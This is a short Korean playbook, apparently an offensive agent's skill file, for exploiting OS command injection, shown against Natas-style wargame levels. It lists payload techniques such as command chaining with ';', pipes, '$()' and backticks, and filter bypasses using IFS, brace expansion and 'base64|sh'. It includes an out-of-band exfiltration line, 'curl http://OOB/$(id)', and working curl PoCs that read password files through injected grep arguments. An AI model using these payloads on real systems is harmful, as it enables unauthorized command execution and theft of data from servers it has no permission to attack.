---
name: command-injection
description: OS 커맨드 인젝션으로 임의 명령 실행·파일 읽기
---
## When
서버가 사용자 입력을 셸 명령에 넣어 실행하는 정황: 검색(`grep`), 핑(`ping`), DNS(`nslookup`), 이미지 변환, 압축 등. 소스에 `system`/`exec`/`passthru`/`popen`/백틱이 보이거나 입력이 명령 출력에 반영될 때.

## Tools
curl, `bash`. 블라인드면 OOB(수신 가능한 도메인/서버), `sleep`으로 시간기반 확인.

## Procedure
1) 주입점 확인: 입력이 명령에 연결되는지(`;`, `\n`, 백틱, `$()` 테스트).
2) 인라인 실행: `; cmd`, `| cmd`, `&& cmd`, `$(cmd)`, 백틱으로 명령 이어붙임. 주석 `#`으로 뒤 인자 무력화.
3) 필터 우회: 메타문자 차단 시 (a)명령 자체 기능 악용 — 예 `grep <pattern> <victim_file>`에 파일 인자 주입, (b)`IFS`/`{cat,/flag}`/와일드카드/인코딩(base64|sh)로 공백·문자 회피.
4) 블라인드: 출력이 안 보이면 시간기반(`sleep 5`) 또는 OOB(`curl http://OOB/$(id)`)로 확인 후 데이터 유출.

## PoC
```
# 인라인 (natas9류: grep -i $key file)
curl -s -u user:pass 'http://TARGET/?needle=x;+cat+/etc/natas_webpass/natasN+%23&submit=Search'
# 문자 필터로 ;|& 막힐 때 — grep에 파일 인자 주입(메타문자 불필요)
curl -s -u user:pass --data-urlencode 'needle=.* /etc/natas_webpass/natasN' 'http://TARGET/'
```

## Pitfalls
차단 문자 집합을 소스로 정확히 파악(공백만 막는지, `;|&`만 막는지). 명령 인젝션이 막혀도 **인자 인젝션**(프로그램 옵션·파일 인자)이 열려 있는 경우가 많음. 출력이 잘리면 파일을 grep 패턴/`head`로 부분 유출.
